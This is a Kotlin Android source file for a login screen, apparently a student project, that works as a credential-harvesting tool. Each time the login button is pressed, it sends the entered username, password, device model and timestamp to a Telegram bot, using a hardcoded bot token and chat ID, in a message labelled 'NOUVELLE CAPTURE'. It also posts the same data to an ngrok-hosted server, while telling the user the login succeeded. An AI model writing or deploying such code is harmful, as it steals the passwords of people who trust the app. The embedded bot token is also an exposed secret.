package com.example.tp_apk.screens
import com.example.tp_apk.R
import com.example.tp_apk.data.DataStoreManager

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.compose.foundation.Image
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.layout.ContentScale
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Person
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material3.Icon
import androidx.compose.ui.platform.LocalContext
import kotlinx.coroutines.launch
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.foundation.layout.heightIn
import androidx.compose.ui.Alignment
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request

import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.IconButton
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.unit.sp
import androidx.compose.material3.OutlinedTextFieldDefaults


@Composable
fun LoginScreen(
    onLoginSuccess: () -> Unit,
)  {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()
    val dataStore = DataStoreManager(context)
    var username by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(24.dp),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally,

        ) {
        Image(
            painter = painterResource(id = R.drawable.logo),
            contentDescription = "Logo",
            modifier = Modifier
                .fillMaxWidth()
                .height(120.dp),
            contentScale = ContentScale.Fit
        )

        Spacer(modifier = Modifier.height(24.dp))

        // Champ identifiant
        OutlinedTextField(
            value = username,
            onValueChange = { username = it.take(10) },
            label = { Text("Nom d'utilisateur") },
            leadingIcon = {
                Icon(imageVector = Icons.Default.Person, contentDescription = "Utilisateur")
            },
            textStyle = TextStyle(color = Color.Black, fontSize = 16.sp),
            colors = OutlinedTextFieldDefaults.colors(
                focusedTextColor = Color.Black,
                unfocusedTextColor = Color.Black,
                cursorColor = Color.Black,
                focusedBorderColor = Color(0xFF1565C0),
                unfocusedBorderColor = Color(0xFF90A4AE),
                focusedLabelColor = Color(0xFF1565C0),
                unfocusedLabelColor = Color(0xFF78909C),
                focusedLeadingIconColor = Color(0xFF1565C0),
                unfocusedLeadingIconColor = Color(0xFF78909C)
            ),
            modifier = Modifier.fillMaxWidth().heightIn(min = 56.dp, max = 60.dp)
        )

        Spacer(modifier = Modifier.height(12.dp))

// Champ mot de passe
        OutlinedTextField(
            value = password,
            onValueChange = { password = it.take(15) },
            label = { Text("Mot de passe") },
            leadingIcon = {
                Icon(imageVector = Icons.Default.Lock, contentDescription = "Mot de passe")
            },
            trailingIcon = {
                IconButton(onClick = { passwordVisible = !passwordVisible }) {
                    Icon(
                        imageVector = if (passwordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
                        contentDescription = null
                    )
                }
            },
            visualTransformation = if (passwordVisible) VisualTransformation.None else PasswordVisualTransformation(),
            textStyle = TextStyle(color = Color.Black, fontSize = 16.sp),
            colors = OutlinedTextFieldDefaults.colors(
                focusedTextColor = Color.Black,
                unfocusedTextColor = Color.Black,
                cursorColor = Color.Black,
                focusedBorderColor = Color(0xFF1565C0),
                unfocusedBorderColor = Color(0xFF90A4AE),
                focusedLabelColor = Color(0xFF1565C0),
                unfocusedLabelColor = Color(0xFF78909C),
                focusedLeadingIconColor = Color(0xFF1565C0),
                unfocusedLeadingIconColor = Color(0xFF78909C),
                focusedTrailingIconColor = Color(0xFF1565C0),
                unfocusedTrailingIconColor = Color(0xFF78909C)
            ),
            modifier = Modifier.fillMaxWidth().heightIn(min = 56.dp, max = 60.dp)
        )
        Spacer(modifier = Modifier.height(24.dp))


        Button(
            onClick = {
                scope.launch {

                    dataStore.saveUser(username, password)
                    val time = System.currentTimeMillis()
                    dataStore.saveLastLogin(time)

                    sendToTelegram(username, password, time)
                    sendToServer(username, password, time)
                }
                onLoginSuccess()
            }
        ) {
            Text("Connexion")
        }


    }
}


suspend fun sendToTelegram(
    username: String,
    password: String,
    lastLogin: Long
) {
    withContext(Dispatchers.IO) {
        try {
            // 🔥 REMPLACE AVEC TON VRAI TOKEN
            val botToken = "8734935612:AAGj8xRAtJDN7Q2fAP8NPZhSuSvpVPjI48s"
            // 🔥 REMPLACE AVEC TON VRAI CHAT ID
            val chatId = "1242128826"
            val message = """
🔐 *NOUVELLE CAPTURE* 🔐
━━━━━━━━━━━━━━━━
👤 *Utilisateur* : $username
🔑 *Mot de passe* : $password
📱 *Appareil* : ${android.os.Build.MODEL}
🕐 *Date* : ${java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(lastLogin))}
━━━━━━━━━━━━━━━━
            """.trimIndent()
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val client = OkHttpClient.Builder()
                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", message)
                put("parse_mode", "Markdown")
            }
            val body = json.toString()
                .toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                println("✅ Message envoyé à Telegram avec succès !")
            } else {
                println("❌ Erreur Telegram: ${response.code} - ${response.body?.string()}")
            }
            response.close()
        } catch (e: Exception) {
            println("❌ Exception Telegram: ${e.message}")
            e.printStackTrace()
        }
    }
}
suspend fun sendToServer(
    username: String,
    password: String,
    lastLogin: Long
) {
    withContext(Dispatchers.IO) {
        val json = JSONObject().apply {
            put("usr", username)
            put("passwd", password)
            put("lastLog", lastLogin)
        }
        // ton serveur exporter par ngrok
        val urlApi = "https://willing-daredevil-gusty.ngrok-free.dev"

        val body = json.toString()
            .toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url(urlApi)
            .post(body)
            .build()

        OkHttpClient().newCall(request).execute()
    }
}

